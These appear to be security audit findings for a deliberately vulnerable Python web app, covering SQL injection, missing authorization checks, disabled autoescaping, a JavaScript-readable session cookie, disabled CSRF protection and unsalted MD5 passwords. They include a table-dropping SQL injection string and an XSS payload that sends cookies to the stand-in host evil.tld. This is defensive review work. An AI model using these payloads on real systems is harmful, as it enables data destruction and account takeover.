extra.message: Student.create() builds the INSERT statement with Python string formatting (`%` operator) directly on the caller-supplied `name` argument, then executes the resulting string with cur.execute(q) with no bound parameters. `name` originates from the unauthenticated POST handler `students()` in sqli/views.py (`data['name']`), so an attacker can break out of the string literal (e.g. name=`x'); DROP TABLE students;--`) to inject arbitrary SQL. Every other DAO in this file uses proper parameter binding (%s / %(name)s passed to execute) except this one.

The courses() handler accepts POST requests and creates a course record from raw form data with no authentication or authorization check. The UI (courses.jinja2) only renders the 'Add new course' form when `auth_user.is_admin` is true, but that is a client-side/template-only gate — the handler itself never calls get_auth_user()/authorize(). Any anonymous user can POST directly to /courses/ to create arbitrary courses, bypassing the intended admin-only restriction.

The evaluate() handler assigns a grade (Mark) to any student for any course based solely on URL path parameters and POST body, with no call to get_auth_user()/authorize(). The 'Evaluate students' form is only shown to admins in course.jinja2, but the endpoint itself performs no authorization check, so any unauthenticated user can POST to /students/{student_id}/evaluate/{course_id} and assign arbitrary points to arbitrary students.

The students() handler creates a new student record from POST data with no authentication check, even though the add-student form is only rendered in the template when a user is logged in (auth_user). Any unauthenticated client can POST directly to /students/ to create arbitrary student records.

setup_jinja() is configured with autoescape=False for the whole application. This disables Jinja2's default HTML auto-escaping, so any template variable containing user-controlled data (student names, course titles/descriptions, review text) is rendered verbatim into HTML unless the template author manually adds `| e`. This is the root cause enabling the stored XSS sinks found in students.jinja2, courses.jinja2 and course.jinja2.

A name like `<script>document.location='//evil.tld/?c='+document.cookie</script>` is stored in the DB and executed in the browser of anyone viewing the student list.

extra.message: RedisStorage is explicitly configured with httponly=False, so the session cookie (which carries `user_id` and grants authenticated access) is readable by JavaScript. Combined with the stored XSS sinks in this app, this allows session-cookie theft and full account takeover instead of just page defacement.

csrf_middleware (defined in sqli/middlewares.py and actively used to generate/embed `_csrf_token` in every form) is commented out of the middlewares list, so the token is never actually verified on any POST request. All state-changing endpoints (student/course creation, evaluate, review, login) are therefore vulnerable to CSRF despite the app appearing to have CSRF protection.

check_password() compares stored `pwd_hash` against an unsalted MD5 digest of the supplied password. MD5 is cryptographically broken and fast to brute-force/rainbow-table; passwords should use a salted, slow KDF (bcrypt/scrypt/argon2) instead.
